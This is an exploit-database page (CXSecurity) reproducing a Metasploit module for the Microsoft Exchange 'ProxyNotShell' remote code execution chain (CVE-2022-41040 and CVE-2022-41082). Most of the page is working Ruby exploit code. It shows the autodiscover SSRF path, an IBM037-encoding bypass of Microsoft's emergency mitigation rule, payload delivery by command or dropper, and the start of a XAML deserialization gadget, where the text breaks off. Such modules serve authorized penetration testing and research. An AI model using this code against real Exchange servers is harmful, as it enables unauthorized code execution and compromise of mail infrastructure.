---
title: Microsoft Exchange ProxyNotShell Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022120006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-12-02
fetch_date: 2025-10-04T00:15:56.161329
---

# Microsoft Exchange ProxyNotShell Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft Exchange ProxyNotShell Remote Code Execution** **2022.12.01**  Credit:  **[Soroush Dalili](https://cxsecurity.com/author/Soroush%2BDalili/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-41040](https://cxsecurity.com/cveshow/CVE-2022-41040/ "Click to see CVE-2022-41040")** | **[CVE-2022-41082](https://cxsecurity.com/cveshow/CVE-2022-41082/ "Click to see CVE-2022-41082")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::CmdStager
include Msf::Exploit::Remote::HTTP::Exchange
include Msf::Exploit::Remote::HTTP::Exchange::ProxyMaybeShell
include Msf::Exploit::EXE
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Microsoft Exchange ProxyNotShell RCE',
'Description' => %q{
This module chains two vulnerabilities on Microsoft Exchange Server
that, when combined, allow an authenticated attacker to interact with
the Exchange Powershell backend (CVE-2022-41040), where a
deserialization flaw can be leveraged to obtain code execution
(CVE-2022-41082). This exploit only support Exchange Server 2019.
These vulnerabilities were patched in November 2022.
},
'Author' => [
'Orange Tsai', # Discovery of ProxyShell SSRF
'Spencer McIntyre', # Metasploit module
'DA-0x43-Dx4-DA-Hx2-Tx2-TP-S-Q', # Vulnerability analysis
'Piotr Bazydło', # Vulnerability analysis
'Rich Warren', # EEMS bypass via ProxyNotRelay
'Soroush Dalili' # EEMS bypass
],
'References' => [
[ 'CVE', '2022-41040' ], # ssrf
[ 'CVE', '2022-41082' ], # rce
[ 'URL', 'https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend' ],
[ 'URL', 'https://msrc-blog.microsoft.com/2022/09/29/customer-guidance-for-reported-zero-day-vulnerabilities-in-microsoft-exchange-server/' ],
[ 'URL', 'https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9' ],
[ 'URL', 'https://rw.md/2022/11/09/ProxyNotRelay.html' ]
],
'DisclosureDate' => '2022-09-28', # announcement of limited details, patched 2022-11-08
'License' => MSF\_LICENSE,
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true
},
'Platform' => ['windows'],
'Arch' => [ARCH\_CMD, ARCH\_X64, ARCH\_X86],
'Privileged' => true,
'Targets' => [
[
'Windows Dropper',
{
'Platform' => 'windows',
'Arch' => [ARCH\_X64, ARCH\_X86],
'Type' => :windows\_dropper
}
],
[
'Windows Command',
{
'Platform' => 'windows',
'Arch' => [ARCH\_CMD],
'Type' => :windows\_command
}
]
],
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'AKA' => ['ProxyNotShell'],
'Reliability' => [REPEATABLE\_SESSION]
}
)
)
register\_options([
OptString.new('USERNAME', [ true, 'A specific username to authenticate as' ]),
OptString.new('PASSWORD', [ true, 'The password to authenticate with' ]),
OptString.new('DOMAIN', [ false, 'The domain to authenticate to' ])
])
register\_advanced\_options([
OptEnum.new('EemsBypass', [ true, 'Technique to bypass the EEMS rule', 'IBM037v1', %w[IBM037v1 none]])
])
end
def check
@ssrf\_email ||= Faker::Internet.email
res = send\_http('GET', '/mapi/nspi/')
return CheckCode::Unknown if res.nil?
return CheckCode::Unknown('Server responded with 401 Unauthorized.') if res.code == 401
return CheckCode::Safe unless res.code == 200 && res.get\_html\_document.xpath('//head/title').text == 'Exchange MAPI/HTTP Connectivity Endpoint'
# actually run the powershell cmdlet and see if it works, this will fail if:
# \* the credentials are incorrect (USERNAME, PASSWORD, DOMAIN)
# \* the exchange emergency mitigation service M1 rule is in place
return CheckCode::Safe unless execute\_powershell('Get-Mailbox')
CheckCode::Vulnerable
rescue Msf::Exploit::Failed => e
CheckCode::Safe(e.to\_s)
end
def ibm037(string)
string.encode('IBM037').force\_encoding('ASCII-8BIT')
end
def send\_http(method, uri, opts = {})
opts[:authentication] = {
'username' => datastore['USERNAME'],
'password' => datastore['PASSWORD'],
'preferred\_auth' => 'NTLM'
}
if uri =~ /powershell/i && datastore['EemsBypass'] == 'IBM037v1'
uri = "/Autodiscover/autodiscover.json?#{ibm037(@ssrf\_email + uri + '?')}&#{ibm037('Email')}=#{ibm037('Autodiscover/autodiscover.json?' + @ssrf\_email)}"
opts[:headers] = {
'X-Up-Devcap-Post-Charset' => 'IBM037',
# technique needs the "UP" prefix, see: https://github.com/Microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System/net/System/Net/HttpListenerRequest.cs#L362
'User-Agent' => "UP #{datastore['UserAgent']}"
}
else
uri = "/Autodiscover/autodiscover.json?#{@ssrf\_email + uri}?&Email=Autodiscover/autodiscover.json?#{@ssrf\_email}"
end
super(method, uri, opts)
end
def exploit
# if we're doing pre-exploit checks, make sure the target is Exchange Server 2019 because the XamlGadget does not
# work on Exchange Server 2016
if datastore['AutoCheck'] && !datastore['ForceExploit'] && (version = exchange\_get\_version)
vprint\_status("Detected Exchange version: #{version}")
if version < Rex::Version.new('15.2')
fail\_with(Failure::NoTarget, 'This exploit is only compatible with Exchange Server 2019 (version 15.2)')
end
end
@ssrf\_email ||= Faker::Internet.email
case target['Type']
when :windows\_command
vprint\_status("Generated payload: #{payload.encoded}")
execute\_command(payload.encoded)
when :windows\_dropper
execute\_cmdstager({ linemax: 7\_500 })
end
end
def execute\_command(cmd, \_opts = {})
xaml = Nokogiri::XML(<<-XAML, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root
<ResourceDictionary
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:System="clr-namespace:System;assembly=mscorlib"
xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
<ObjectDataProvider x:Key="LaunchCalch" ObjectType="{x:Type Diag:Process}" MethodName="Start">
<ObjectDataProvider.MethodPar...